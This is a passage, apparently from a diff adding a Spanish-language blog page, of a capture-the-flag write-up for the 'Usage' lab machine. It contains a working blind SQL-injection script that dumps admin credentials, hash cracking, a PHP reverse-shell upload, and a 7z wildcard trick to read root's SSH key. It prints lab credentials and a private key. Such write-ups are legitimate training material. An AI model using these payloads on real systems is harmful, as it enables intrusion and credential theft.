+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> <span style="color:#a5d6ff">&#34;We have&#34;</span> <span style="color:#ff7b72;font-weight:bold">in</span> r<span style="color:#ff7b72;font-weight:bold">.</span>text:
+</span></span><span style="display:flex;"><span>         os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>         box <span style="color:#ff7b72;font-weight:bold">=</span> box <span style="color:#ff7b72;font-weight:bold">+</span> char
+</span></span><span style="display:flex;"><span>         print(box)
+</span></span><span style="display:flex;"><span>         <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>Encontramos como columnas relevantes <code>username</code> y <code>password</code></p>
+<img src="/images/Pasted image 20260128011321.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="obtener-valores-de-columnas">
+  Obtener valores de columnas
+  <a class="heading-link" href="#obtener-valores-de-columnas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para obtener los valores de las columnas interesadas, en este caso <code>username</code> y <code>password</code>, tenemos el siguiente payload</p>
+<p><strong>NOTA:</strong> <code>BINARY</code> se utiliza para hacer que la petición de case-sensitive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>or substring<span style="color:#ff7b72;font-weight:bold">((</span><span style="color:#ff7b72">select</span> group_concat<span style="color:#ff7b72;font-weight:bold">(</span>BINARY username, <span style="color:#a5d6ff">&#39;:&#39;</span>, BINARY password<span style="color:#ff7b72;font-weight:bold">)</span> from admin_users<span style="color:#ff7b72;font-weight:bold">)</span>,<span style="color:#ff7b72;font-weight:bold">{</span>pos<span style="color:#ff7b72;font-weight:bold">}</span>,1<span style="color:#ff7b72;font-weight:bold">)=</span><span style="color:#a5d6ff">&#39;{char}&#39;</span>--+-
+</span></span></code></pre></div><p>El siguiente script permite obtener los datos de <code>username</code> y <code>password</code>, los resultados aparecerán separados por dos puntos <code>:</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">re</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>baseURL <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://usage.htb&#34;</span>
+</span></span><span style="display:flex;"><span>param <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/forget-password&#34;</span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;,&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34;:&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>ascii_letters <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>digits <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>punctuation
+</span></span><span style="display:flex;"><span>box <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener CSRF</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>get(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param)
+</span></span><span style="display:flex;"><span>token <span style="color:#ff7b72;font-weight:bold">=</span> re<span style="color:#ff7b72;font-weight:bold">.</span>search(<span style="color:#79c0ff">r</span><span style="color:#a5d6ff">&#39;name=&#34;_token&#34; value=&#34;(.*?)&#34;&#39;</span>, r<span style="color:#ff7b72;font-weight:bold">.</span>text)<span style="color:#ff7b72;font-weight:bold">.</span>group(<span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] CSRF:&#34;</span>, token)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] Cookies:&#34;</span>, s<span style="color:#ff7b72;font-weight:bold">.</span>cookies)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">1</span>,<span style="color:#a5d6ff">300</span>):
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">for</span> char <span style="color:#ff7b72;font-weight:bold">in</span> (characters):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;or substring((select group_concat(BINARY username, &#39;:&#39;, BINARY password) from admin_users),</span><span style="color:#a5d6ff">{</span>pos<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">,1)=&#39;</span><span style="color:#a5d6ff">{</span>char<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>     data <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;_token&#34;</span>:token,<span style="color:#a5d6ff">&#34;email&#34;</span>:<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;admin@admin.htb&#39; </span><span style="color:#a5d6ff">{</span>payload<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>}
+</span></span><span style="display:flex;"><span>     r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>post(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param,json<span style="color:#ff7b72;font-weight:bold">=</span>data)
+</span></span><span style="display:flex;"><span>     print(payload)
+</span></span><span style="display:flex;"><span>     <span style="color:#ff7b72">if</span> <span style="color:#a5d6ff">&#34;We have&#34;</span> <span style="color:#ff7b72;font-weight:bold">in</span> r<span style="color:#ff7b72;font-weight:bold">.</span>text:
+</span></span><span style="display:flex;"><span>        os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>        box <span style="color:#ff7b72;font-weight:bold">=</span> box <span style="color:#ff7b72;font-weight:bold">+</span> char
+</span></span><span style="display:flex;"><span>        print(box)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>Obtenemos el usuario <code>admin</code> y el siguiente hash <code>$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2</code></p>
+<img src="/images/Pasted image 20260128012953.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="crackeando-hash">
+  Crackeando hash
+  <a class="heading-link" href="#crackeando-hash">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>El hash obtenido lo guardamos en un archivo llamado <code>hash.txt</code>, y utilizamos <code>john</code> para crackearlo, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span></code></pre></div><p>y obtenemos la contraseña <code>whatever1</code></p>
+<img src="/images/Pasted image 20260128013359.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora probaremos entrar con las credenciales en el subdominio <code>admin.usage.htb</code></p>
+<img src="/images/Pasted image 20260128013529.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y entramos exitosamente como <code>Administrator</code></p>
+<img src="/images/Pasted image 20260128013549.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="explotando-file-upload">
+  Explotando File upload
+  <a class="heading-link" href="#explotando-file-upload">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si buscamos por vulnerabilidades de <code>laravel 10.18.0</code> encontramos algunas menciones de subida arbitraria de archivos que permiten ejecución de comandos</p>
+<img src="/images/Pasted image 20260128013750.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Viendo la página de <code>laravel</code>, encontramos que podemos subir una imagen como <code>avatar</code></p>
+<img src="/images/Pasted image 20260128013927.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto probamos subir una imagen cualquiera</p>
+<p>y vemos que nos permite subir imágenes, y tenemos la ruta en donde se suben, que es <code>/uploads/images/foto.jpg</code></p>
+<img src="/images/Pasted image 20260128014102.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Probaremos interceptar la petición, y enviar un archivo <code>.PHP</code> que nos envíe una <code>reverse shell</code></p>
+<p>Enviamos la petición editando el nombre, poniendo <code>shell.jpg.php</code>, y mandando el contenido de la <code>reverse shell</code> en <code>PHP</code></p>
+<img src="/images/Pasted image 20260128014813.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Vemos que nuestro script se subió de manera correcta</p>
+<img src="/images/Pasted image 20260128014627.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora si nos ponemos en escucha con <code>netcat</code>, y vamos hacia la ruta <code>/uploads/images/shell1.jpg.php</code>, obtendremos la consola interactiva</p>
+<img src="/images/Pasted image 20260128015106.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="movimiento-lateral">
+  Movimiento lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Una vez en la máquina víctima, vemos que somos el usuario <code>dash</code></p>
+<img src="/images/Pasted image 20260128015204.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Además sabemos que existe el usuario <code>xander</code>, ya que tiene directorio en <code>/home</code> y usa <code>bash</code></p>
+<img src="/images/Pasted image 20260128015256.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si vamos al <code>home</code> de nuestro usuario actual, encontramos la <code>user.txt</code></p>
+<img src="/images/Pasted image 20260128015337.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>También encontramos un archivo inusual, el archivo <code>.monitrc</code>, el cual tenemos permiso de lectura</p>
+<img src="/images/Pasted image 20260128015412.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Procedemos a leerlo, y encontramos unas credenciales <code>admin:3nc0d3d_pa$$w0rd</code></p>
+<img src="/images/Pasted image 20260128015642.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Probamos a utilizar la contraseña, y el usuario <code>xander</code> para conectarnos por <code>SSH</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh xander@usage.htb
+</span></span></code></pre></div><p>y nos conectamos a la máquina víctima como este nuevo usuario</p>
+<img src="/images/Pasted image 20260128015806.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Para escalar privilegios, vemos los permisos de sudoers que tiene este nuevo usuario, y vemos que tiene permiso para ejecutar el binario <code>/usr/bin/usage_management</code> sin la necesidad de proporcionar contraseña</p>
+<img src="/images/Pasted image 20260128015857.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si le hacemos un <code>strings</code> al binario, podemos ver algunas cosas que realiza</p>
+<p>Vemos que se mueve hacia la ruta <code>/var/www/html</code>, y posteriormente utiliza <code>7za</code> para comprimir todo lo que se encuentra ahí</p>
+<img src="/images/Pasted image 20260128015958.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Buscando por formas de explotar <code>wildcards</code>, encontramos una forma para hacerlo con <code>7z</code></p>
+<img src="/images/Pasted image 20260128020136.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto utilizaremos esto para leer el <code>id_rsa</code> del usuario root, y posteriormente conectarnos por <code>SSH</code> sin proporcionar contraseña</p>
+<p>Crearemos el archivo <code>@id_rsa</code> en el directorio <code>/var/www/html</code>, y generaremos un enlace simbólico hacía  <code>/root/.ssh/id_rsa</code></p>
+<img src="/images/Pasted image 20260128020356.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora utilizamos el binario como sudo, y le daremos a la opción 1, obteniendo el <code>id_rsa</code> de root</p>
+<img src="/images/Pasted image 20260128020830.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Tratando el output obtenido, tenemos lo siguiente</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+</span></span><span style="display:flex;"><span>QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+</span></span><span style="display:flex;"><span>QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+</span></span><span style="display:flex;"><span>AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM</span><span style="color:#ff7b72;font-weight:bold">=</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>Lo guardamos en local y le damos el permiso <code>chmod 600 id_rsa</code>, y para conectarnos utilizaremos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@usage.htb -i id_rsa
+</span></span></code></pre></div><img src="/images/Pasted image 20260128021020.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y nos conectamos como <code>root</code>, y obtenemos la <code>root.txt</code></p>
+<img src="/images/Pasted image 20260128021042.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
